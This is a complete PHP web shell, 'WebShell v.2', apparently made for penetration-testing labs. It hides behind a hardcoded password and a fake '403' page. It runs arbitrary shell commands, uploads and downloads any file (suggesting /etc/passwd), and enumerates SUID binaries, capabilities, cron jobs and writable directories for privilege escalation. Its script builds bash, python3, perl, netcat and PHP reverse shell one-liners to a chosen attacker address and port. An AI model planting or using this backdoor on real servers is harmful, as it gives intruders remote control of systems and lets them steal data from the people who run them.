<?php
session_start();

define('PASSWORD', 'sh3ll');

// File download — must run before any output
if (!empty($_POST['dl_path']) && !empty($_SESSION['auth'])) {
    $dl = $_POST['dl_path'];
    if (file_exists($dl) && is_file($dl) && is_readable($dl)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($dl) . '"');
        header('Content-Length: ' . filesize($dl));
        readfile($dl);
        exit;
    }
    $dl_error = 'File not found or not readable.';
}

// Auth
if (isset($_POST['auth_pass'])) {
    if ($_POST['auth_pass'] === PASSWORD) {
        $_SESSION['auth'] = true;
        session_regenerate_id(true);
    } else {
        $auth_error = true;
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

if (empty($_SESSION['auth'])) { ?>
<!DOCTYPE html><html><head><title>403</title>
<style>
body{background:#000;color:#aaffaa;font-family:'Courier New',monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
form{border:2px solid #55ff55;padding:30px;border-radius:8px;box-shadow:0 0 20px rgba(85,255,85,.4)}
input[type=password]{background:#000;color:#aaffaa;border:1px solid #55ff55;padding:8px;font-family:monospace;width:200px}
input[type=submit]{background:#000;color:#aaffaa;border:2px solid #aaffaa;padding:8px 16px;cursor:pointer;font-family:monospace;margin-top:10px;display:block}
.err{color:#ff5555;margin-top:8px}
</style></head><body>
<form method="POST">
<b>Password:</b><br>
<input type="password" name="auth_pass" autofocus><br>
<input type="submit" value="[ Enter ]">
<?php if (!empty($auth_error)) echo '<p class="err">Wrong password.</p>'; ?>
</form></body></html>
<?php exit; } ?>

<style>
@keyframes retroScroll {
    0% { background-position: 0 0; }
    100% { background-position: 0 4px; }
}

@keyframes retroGlow {
    0%,100% { box-shadow: 0 0 6px #22ff55 inset; }
    50%      { box-shadow: 0 0 12px #22ff55 inset; }
}

.retro-terminal {
    margin-top: 15px;
    border: 2px solid #22ff55;
    background: #000;
    border-radius: 6px;
    overflow: hidden;
    background-image:
        linear-gradient(rgba(0,255,70,0.05) 1px, transparent 1px),
        linear-gradient(90deg, rgba(0,255,70,0.02) 1px, transparent 1px);
    background-size: 100% 3px, 3px 100%;
    animation:
        retroScroll 0.4s linear infinite,
        retroGlow 3s ease-in-out infinite;
}

.retro-terminal-header {
    background: #22ff55;
    color: #000;
    padding: 6px 10px;
    font-family: Consolas, monospace;
    font-weight: bold;
    border-bottom: 2px solid #22ff55;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.retro-terminal-body {
    padding: 10px;
    color: #22ff55;
    font-family: Consolas, monospace;
    text-shadow: 0 0 5px #22ff55;
    white-space: pre-wrap;
}

body {
    margin: 0;
    padding: 20px;
    min-height: 100vh;
    font-family: 'Courier New', Courier, monospace;
    font-size: 16px;
    line-height: 1.5;
    color: #aaffaa;
    background: #000;
    display: flex;
    justify-content: center;
    align-items: flex-start;
}

body::before {
    content: '';
    position: fixed;
    top: 0; left: 0;
    width: 100%;
    height: 100%;
    background: repeating-linear-gradient(
        to bottom,
        rgba(0,255,0,0.05),
        rgba(0,255,0,0.05) 1px,
        transparent 1px,
        transparent 3px
    );
    pointer-events: none;
    z-index: 0;
}

.pbp-container {
    position: relative;
    z-index: 1;
    background: rgba(0, 0, 0, 0.9);
    border: 2px solid #55ff55;
    border-radius: 8px;
    padding: 25px 35px;
    max-width: 800px;
    width: 90%;
    box-shadow: 0 0 20px rgba(85, 255, 85, 0.4);
}

@keyframes retroFlicker {
    0%, 100% { text-shadow: 0 0 4px #aaffaa; }
    50% { text-shadow: 0 0 12px #aaffaa; }
}

.pbp-container, h1, h2, h3, p, a {
    animation: retroFlicker 3s ease-in-out infinite;
}

h1, h2, h3 {
    color: #aaffaa;
    text-shadow: 0 0 6px #aaffaa;
    margin: 0 0 12px 0;
}

p {
    margin-bottom: 12px;
}

a {
    color: #aaffaa;
    text-decoration: underline;
}

a:hover {
    color: #ccffcc;
    text-shadow: 0 0 6px #ccffcc;
}

button, input[type=submit] {
    background: #000;
    color: #aaffaa;
    border: 2px solid #aaffaa;
    border-radius: 6px;
    padding: 10px 18px;
    cursor: pointer;
    box-shadow: 0 0 8px rgba(170,255,170,0.5);
    font-family: 'Courier New', monospace;
    transition: all 0.2s ease;
}

button:hover, input[type=submit]:hover {
    box-shadow: 0 0 16px rgba(170,255,170,0.8);
    transform: translateY(-1px);
}

code, pre {
    background: rgba(0,255,0,0.05);
    padding: 4px 8px;
    border-radius: 4px;
    font-family: 'Courier New', monospace;
    color: #aaffaa;
    text-shadow: 0 0 4px #aaffaa;
}

.output-block {
    background-color: #111;
    color: #aaffaa;
    padding: 15px;
    margin: 12px 0;
    border-radius: 8px;
    font-family: monospace;
    border: 1px solid #333;
}

.copy-btn {
    background: #000;
    color: #22ff55;
    border: 1px solid #22ff55;
    border-radius: 4px;
    padding: 2px 10px;
    cursor: pointer;
    font-family: monospace;
    font-size: 12px;
    box-shadow: none;
}

.copy-btn:hover {
    background: #22ff55;
    color: #000;
    transform: none;
    box-shadow: none;
}

.revshell-btn {
    background: #000;
    color: #ffaa00;
    border: 1px solid #ffaa00;
    border-radius: 4px;
    padding: 5px 12px;
    cursor: pointer;
    font-family: monospace;
    font-size: 13px;
    margin: 3px;
    box-shadow: none;
    transition: all 0.15s;
}

.revshell-btn:hover {
    background: #ffaa00;
    color: #000;
    transform: none;
    box-shadow: none;
}

.logout-link {
    float: right;
    font-size: 12px;
    color: #ff5555;
    text-decoration: none;
}

.logout-link:hover {
    color: #ff8888;
}

input[type=text], input[type=number] {
    background: #000;
    color: #aaffaa;
    border: 1px solid #55ff55;
    padding: 5px 8px;
    font-family: 'Courier New', monospace;
    border-radius: 4px;
}
</style>

<body>

<div class="pbp-container">

<a class="logout-link" href="?logout=1">[ logout ]</a>
<font color="#F1F1F1"><b>WebShell v.2 &lt;:~ </b></font><br><br>

<fieldset style="border:2px solid #25F511;border-radius:5px;background:#000000;padding:15px;">

<!-- Command execution -->
<form id="cmd-form" style="color:#25F511;" action="<?php echo htmlspecialchars($_SERVER['PHP_SELF'], ENT_QUOTES, 'UTF-8'); ?>" method="post">
<b>Run Command:</b><br>
<input type="text" id="command" name="command" style="width:70%;" autocomplete="off" value="<?php echo htmlspecialchars($_POST['command'] ?? '', ENT_QUOTES, 'UTF-8'); ?>" />
<input type="submit" value="Run" />

<?php if (!empty($_POST['command'])) : ?>
    <div class="retro-terminal">
        <div class="retro-terminal-header">
            <span>Backdoor</span>
            <button type="button" class="copy-btn" onclick="copyOutput()">copy</button>
        </div>
        <div class="retro-terminal-body" id="cmd-output">
            <?php echo htmlspecialchars(shell_exec($_POST['command']), ENT_QUOTES, 'UTF-8'); ?>
        </div>
    </div>
<?php endif; ?>
</form>

<br>

<!-- Reverse shell launchers -->
<b>Reverse Shells:</b><br>
<?php
$tun0_ip = trim(shell_exec("ip addr show tun0 2>/dev/null | grep 'inet ' | awk '{print \$2}' | cut -d/ -f1"));
if (empty($tun0_ip)) $tun0_ip = '';
?>
<div style="margin:8px 0;">
    LHOST: <input type="text" id="rs-ip" value="<?php echo htmlspecialchars($tun0_ip, ENT_QUOTES, 'UTF-8'); ?>" style="width:140px;" placeholder="10.10.14.x" />
    &nbsp;LPORT: <input type="number" id="rs-port" value="4444" style="width:70px;" />
    <br><br>
    <button type="button" class="revshell-btn" onclick="setShell('bash')">bash</button>
    <button type="button" class="revshell-btn" onclick="setShell('python3')">python3</button>
    <button type="button" class="revshell-btn" onclick="setShell('perl')">perl</button>
    <button type="button" class="revshell-btn" onclick="setShell('nc')">nc mkfifo</button>
    <button type="button" class="revshell-btn" onclick="setShell('php')">php</button>
</div>

<br>
<b>System Info:</b>
<hr style="border-color:#333;">

<b>Kernel &amp; OS</b>
<?php
$uname = shell_exec("uname -a; awk -F= '/^(PRETTY_NAME|BUILD_ID)=/ { gsub(/\"/, \"\", \$2); print \$1\": \"\$2 }' /etc/os-release");
echo "<pre>" . htmlspecialchars($uname, ENT_QUOTES, 'UTF-8') . "</pre>";
?>

<b>User</b>
<?php
$user = shell_exec("whoami; id");
echo "<pre>" . htmlspecialchars($user, ENT_QUOTES, 'UTF-8') . "</pre>";
?>

<b>Connected Users</b>
<?php
$users = shell_exec("who -u");
echo "<pre>" . htmlspecialchars($users, ENT_QUOTES, 'UTF-8') . "</pre>";
?>

<b>Network Interfaces</b>
<?php
$ip_addr = shell_exec("ip addr | grep inet | grep -v inet6 | awk '{print \$2}' | grep -v 127");
echo "<pre>" . htmlspecialchars($ip_addr, ENT_QUOTES, 'UTF-8') . "</pre>";
?>

<b>Listening Ports</b>
<?php
$ports = shell_exec("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null");
echo "<pre>" . htmlspecialchars($ports, ENT_QUOTES, 'UTF-8') . "</pre>";
?>

<b>Cron Jobs</b>
<?php
$cron = shell_exec("cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null; crontab -l 2>/dev/null");
echo "<pre>" . htmlspecialchars($cron, ENT_QUOTES, 'UTF-8') . "</pre>";
?>

<b>SUIDs</b>
<?php
$SUIDS = shell_exec("find / -xdev -perm -4000 -type f 2>/dev/null | head -100");
echo "<pre>" . htmlspecialchars($SUIDS, ENT_QUOTES, 'UTF-8') . "</pre>";
?>

<b>Capabilities</b>
<?php
$caps = shell_exec("getcap -r / 2>/dev/null | head -100");
echo "<pre>" . htmlspecialchars($caps, ENT_QUOTES, 'UTF-8') . "</pre>";
?>

<b>Disks</b>
<?php
$disk = shell_exec("df -h");
echo "<pre>" . htmlspecialchars($disk, ENT_QUOTES, 'UTF-8') . "</pre>";
?>

</fieldset>

<br>

<fieldset style="border:2px solid #5555ff;border-radius:5px;background:#000;padding:15px;">
<b style="color:#aaaaff;">File Operations</b><br><br>

<!-- Upload -->
<form style="display:inline-block;vertical-align:top;color:#ffffff;margin-right:40px;" action="" method="POST" enctype="multipart/form-data">
<b>Upload</b><br>
<b>Destination path:</b><br>
<input type="text" name="upload" placeholder="/var/www/html/" style="width:220px;" /><br><br>
<input type="file" name="file" /><br><br>
<input type="submit" value="Upload" />
<b>Current dir:</b>
<div class="output-block">
<?php
$pwd = shell_exec("pwd");
echo "<pre>" . htmlspecialchars($pwd, ENT_QUOTES, 'UTF-8') . "</pre>";
?>
</div>
<b>Writable dirs</b>
<div class="output-block">
<?php
$R_W_dirs = shell_exec(
    "find / -xdev \\( -path /proc -o -path /sys -o -path /dev -o -path /run \\) " .
    "-prune -o -type d -perm -0002 -print 2>/dev/null"
);
echo "<pre>" . htmlspecialchars($R_W_dirs, ENT_QUOTES, 'UTF-8') . "</pre>";
?>
</div>
</form>

<!-- Download -->
<form style="display:inline-block;vertical-align:top;color:#ffffff;" action="" method="POST">
<b>Download</b><br>
<b>Remote file path:</b><br>
<input type="text" name="dl_path" placeholder="/etc/passwd" style="width:220px;" /><br><br>
<input type="submit" value="Download" />
<?php if (!empty($dl_error)) echo '<p style="color:#ff5555;">' . htmlspecialchars($dl_error, ENT_QUOTES, 'UTF-8') . '</p>'; ?>
</form>

</fieldset>

<?php if (!empty($_FILES['file'])) :
    $file_name = $_FILES['file']['name'];
    $file_tmp  = $_FILES['file']['tmp_name'];
    $dest_dir  = rtrim($_POST['upload'], '/') . '/';
    if (!empty($_POST['upload']) && is_dir($_POST['upload'])) {
        if (move_uploaded_file($file_tmp, $dest_dir . $file_name)) {
            echo '<div class="output-block">';
            echo 'Uploaded: ' . htmlspecialchars($file_name, ENT_QUOTES, 'UTF-8') . '<br>';
            echo 'Size: ' . round($_FILES['file']['size'] / 1024, 2) . ' KB<br>';
            echo 'Stored in: ' . htmlspecialchars($dest_dir, ENT_QUOTES, 'UTF-8');
            echo '</div>';
        } else {
            echo '<p style="color:#ff5555;">Upload failed (permissions or disk full).</p>';
        }
    } else {
        echo '<p style="color:#ff5555;">Invalid or missing upload path.</p>';
    }
endif; ?>

</div><!-- .pbp-container -->

<script>
// Command history
var cmdHistory = JSON.parse(localStorage.getItem('ws_history') || '[]');
var histIdx = -1;
var cmdInput = document.getElementById('command');

document.getElementById('cmd-form').addEventListener('submit', function() {
    var val = cmdInput.value.trim();
    if (val && cmdHistory[0] !== val) {
        cmdHistory.unshift(val);
        if (cmdHistory.length > 50) cmdHistory.pop();
        localStorage.setItem('ws_history', JSON.stringify(cmdHistory));
    }
});

cmdInput.addEventListener('keydown', function(e) {
    if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (histIdx < cmdHistory.length - 1) histIdx++;
        cmdInput.value = cmdHistory[histIdx] || '';
    } else if (e.key === 'ArrowDown') {
        e.preventDefault();
        histIdx = Math.max(-1, histIdx - 1);
        cmdInput.value = histIdx >= 0 ? cmdHistory[histIdx] : '';
    }
});

// Copy output
function copyOutput() {
    var el = document.getElementById('cmd-output');
    if (!el) return;
    navigator.clipboard.writeText(el.innerText).catch(function() {
        var r = document.createRange();
        r.selectNode(el);
        window.getSelection().removeAllRanges();
        window.getSelection().addRange(r);
        document.execCommand('copy');
        window.getSelection().removeAllRanges();
    });
}

// Reverse shell launchers
function setShell(type) {
    var ip   = document.getElementById('rs-ip').value.trim();
    var port = document.getElementById('rs-port').value.trim();
    if (!ip || !port) { alert('Set LHOST and LPORT first.'); return; }
    var shells = {
        bash:    "bash -c 'bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1'",
        python3: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"" + ip + "\"," + port + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
        perl:    "perl -e 'use Socket;$i=\"" + ip + "\";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'",
        nc:      "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc " + ip + " " + port + " >/tmp/f",
        php:     "php -r '$s=fsockopen(\"" + ip + "\"," + port + ");$p=proc_open(\"/bin/bash -i\",[0=>$s,1=>$s,2=>$s],$pi);'"
    };
    document.getElementById('command').value = shells[type];
    document.getElementById('command').focus();
}
</script>

</body>
</html>
